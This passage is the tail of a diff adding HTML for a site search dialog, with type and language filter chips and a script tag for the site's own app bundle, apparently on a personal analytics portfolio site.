+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
